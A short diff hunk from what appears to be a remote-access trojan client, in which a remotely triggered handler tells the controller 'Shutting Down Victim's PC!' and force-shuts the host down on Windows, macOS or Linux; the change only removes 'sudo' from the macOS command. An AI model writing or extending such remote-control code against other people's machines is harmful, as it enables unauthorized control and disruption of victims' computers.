@@ -29,7 +29,7 @@ class Client():
                 os.system("shutdown /s /t 1")
             elif self.os_name=="macos":
                 self.client.send("Shutting Down Victim's PC!".encode())
-                os.system("sudo shutdown -h now")
+                os.system("shutdown -h now")
             else:
                 self.client.send("Shutting Down Victim's PC!".encode())
                 os.system("poweroff")
